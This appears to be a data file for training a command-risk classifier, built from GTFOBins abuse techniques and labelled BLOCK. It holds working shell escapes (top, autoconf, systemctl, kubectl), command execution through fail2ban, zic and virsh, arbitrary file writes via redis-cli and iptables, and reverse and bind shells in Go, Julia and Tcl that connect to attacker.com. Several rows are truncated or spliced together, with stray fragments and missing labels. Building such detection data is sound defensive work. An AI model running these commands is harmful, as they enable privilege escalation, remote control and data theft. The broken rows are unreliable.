description: 内置平衡训练数据集：GTFOBins 危险命令清洗 + 安全/中等风险操作平衡样本

rows.commandLine:
dosbox -c 'mount c /' -c 'copy c:\path\to\input c:\path\to\output' -c exit
cat /path/to/OUTPUT
rows.label: BLOCK

rows.commandLine:
echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
top
# press return twice
reset
rows.label: BLOCK

rows.commandLine:
echo /bin/sh >/path/to/temp-file
chmod +x /path/to/temp-file
touch configure.ac
AUTOM4TE=/path/to/temp-file autoconf
rows.label: BLOCK

rows.commandLine:
iptables -A INPUT -i lo -j ACCEPT -m comment --comment DATA
iptables -S
iptables-save -f /path/to/output-file
rows.label: BLOCK

rows.commandLine:
echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file
echo 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file
zic -d . -y /path/to/command /path/to/temp-file
rows.label: BLOCK

rows.commandLine:
fail2ban-client add x
fail2ban-client set x addaction x
fail2ban-client set x action x actionban /path/to/command
fail2ban-client start x
fail2ban-client set x banip 999.999.999.999
fail2ban-client set x unbanip 999.999.999.999
fail2ban-client stop x
rows.label: BLOCK

rows.commandLine:
cat >/path/to/temp-dir/fail2ban.conf <<EOF
[Definition]
EOF

cat >/path/to/temp-dir/jail.local <<EOF
[x]
enabled = true
action = x
EOF

mkdir -p /path/to/temp-dir/action.d/
cat >/path/to/temp-dir/action.d/x.conf <<EOF
[Definition]
actionstart = /path/to/command
EOF

mkdir -p /path/to/temp-dir/filter.d/
cat >/path/to/temp-dir/filter.d/x.conf <<EOF
[Definition]
EOF

fail2ban-client -c /path/to/temp-dir/ -v restart
rows.label: BLOCK

rows.commandLine:

ExecStart=/path/to/command
[Install]
WantedBy=multi-user.target' >/path/to/temp-file.service
systemctl link /path/to/temp-file.service
systemctl enable --now /path/to/temp-file.service

rows.commandLine:
echo /bin/sh >/path/to/temp-file
chmod +x /path/to/temp-file
SYSTEMD_EDITOR=/path/to/temp-file systemctl edit basic.target

0 3534848 linear /dev/loop0 94208
EOF
dmsetup ls --exec '/bin/sh -s'

rows.commandLine:
cat >/path/to/temp-file <<EOF
clusters:
- cluster:
    server: https://x
  name: x
contexts:
- context:
    cluster: x
    user: x
  name: x
current-context: x
users:
- name: x
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      interactiveMode: Always
      command: /bin/sh
      args:
        - '-c'
        - '/bin/sh 0<&2 1>&2'
EOF

kubectl get pods --kubeconfig=/path/to/temp-file

rows.commandLine:
redis-cli -h 127.0.0.1
config set dir /path/to/output-dir/
config set dbfilename output-file
set x "DATA"
save

rows.commandLine:
bash -c '{ echo -ne "GET /path/to/input-file HTTP/1.0
host: attacker.com

" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/attacker.com/12345 \
    | { while read -r; do [ "$REPLY" = "$(echo -ne "")" ] && break; done; cat; } >/path/to/output-file'
args:

host: attacker.com

git -C . commit --allow-empty -m x

rows.commandLine:
echo -e 'package main
import (
	"os"
	"net"
	"syscall"
)

func main(){
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	ip := net.ParseIP("attacker.com").To4()
	addr := &syscall.SockaddrInet4{Port: 12345}
	copy(addr.Addr[:], ip)
	syscall.Connect(fd, addr)
	syscall.Dup2(fd, 0)
	syscall.Dup2(fd, 1)
	syscall.Dup2(fd, 2)
	syscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())
}' >/path/to/temp-file.go
go run /path/to/temp-file.go
args:
package main

	"os"
	"net"
	"syscall"
)

func main(){

	ip := net.ParseIP("attacker.com").To4()
	addr := &syscall.SockaddrInet4{Port: 12345}
	copy(addr.Addr[:], ip)
	syscall.Connect(fd, addr)
	syscall.Dup2(fd, 0)
	syscall.Dup2(fd, 1)
	syscall.Dup2(fd, 2)
	syscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())
}
rows.label: BLOCK

rows.commandLine:
echo -e 'package main
import (
	"os"
	"syscall"
)

func main(){
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	addr := &syscall.SockaddrInet4{Port: 12345}
	copy(addr.Addr[:], []byte{0,0,0,0})
	syscall.Bind(fd, addr)
	syscall.Listen(fd, 1)
	nfd, _, _ := syscall.Accept(fd)
	syscall.Dup2(nfd, 0)
	syscall.Dup2(nfd, 1)
	syscall.Dup2(nfd, 2)
	syscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())
}' >/path/to/temp-file.go
go run /path/to/temp-file.go
args:
package main
import (
	"os"
	"syscall"
)

func main(){
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	addr := &syscall.SockaddrInet4{Port: 12345}
	copy(addr.Addr[:], []byte{0,0,0,0})
	syscall.Bind(fd, addr)
	syscall.Listen(fd, 1)
	nfd, _, _ := syscall.Accept(fd)
	syscall.Dup2(nfd, 0)
	syscall.Dup2(nfd, 1)
	syscall.Dup2(nfd, 2)
	syscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())
}
rows.label: BLOCK

rows.commandLine:
echo -e 'package main
import "os"
func main(){
	f, _ := os.OpenFile("/path/to/output-file", os.O_RDWR|os.O_CREATE, 0644)
	f.Write([]byte("DATA\n"))
	f.Close()
}' >/path/to/temp-file.go
go run /path/to/temp-file.go
rows.label: BLOCK

rows.commandLine: julia -e 'using Sockets; sock=connect("attacker.com", parse(Int64, 12345)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
args: using Sockets; sock=connect("attacker.com", parse(Int64, 12345)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;
rows.label: BLOCK

rows.commandLine:
cat >/path/to/temp-file.xml <<EOF
<domain type='kvm'>
  <name>x</name>
  <os>
    <type arch='x86_64'>hvm</type>
  </os>
  <memory unit='KiB'>1</memory>
  <devices>
    <interface type='ethernet'>
      <script path='/path/to/command'/>
    </interface>
  </devices>
</domain>
EOF
virsh -c qemu:///system create /path/to/temp-file.xml
virsh -c qemu:///system destroy x
rows.label: BLOCK

rows.commandLine:
echo DATA >/path/to/temp-file

cat >/path/to/temp-file.xml <<EOF
<volume type='file'>
  <name>y</name>
  <key>/path/to/output-dir/output-file</key>
  <source>
  </source>
  <capacity unit='bytes'>5</capacity>
  <allocation unit='bytes'>4096</allocation>
  <physical unit='bytes'>5</physical>
  <target>
    <path>/path/to/output-dir/output-file</path>
    <format type='raw'/>
    <permissions>
      <mode>0600</mode>
      <owner>0</owner>
      <group>0</group>
    </permissions>
  </target>
</volume>
EOF

virsh -c qemu:///system pool-create-as x dir --target /path/to/output-dir/
virsh -c qemu:///system vol-create --pool x --file /path/to/temp-file.xml
virsh -c qemu:///system vol-upload --pool x /path/to/output-dir/output-file /path/to/temp-file
virsh -c qemu:///system pool-destroy x
rows.label: BLOCK

virsh -c qemu:///system vol-download --pool x input-file output-file
virsh -c qemu:///system pool-destroy x

rows.commandLine:
tclsh
set s [socket attacker.com 12345];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;

";print $s $headers . $content;while (<$s>) { }close($s);'

Host: attacker.com
Metadata: true
Connection: close

"; open(my $fh, ">", "/path/to/output-file") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq "
